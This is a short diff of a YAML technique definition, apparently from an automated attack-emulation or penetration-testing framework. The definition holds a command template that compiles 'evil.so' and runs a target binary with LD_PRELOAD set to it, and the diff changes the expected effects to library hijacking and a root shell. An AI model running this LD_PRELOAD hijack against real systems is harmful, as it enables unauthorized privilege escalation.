@@ -7,9 +7,10 @@ parameters:
   target_ip: from_engagement.target_ip
 command_template: gcc -shared -fPIC -o /tmp/evil.so evil.c; LD_PRELOAD=/tmp/evil.so
   {target_binary}
-parser: null
+parser: generic_parser
 expected_effects:
-- action_completed
+- library_hijacked
+- root_shell
 falsifier:
   pattern: error|failed|refused|denied
   timeout: 30
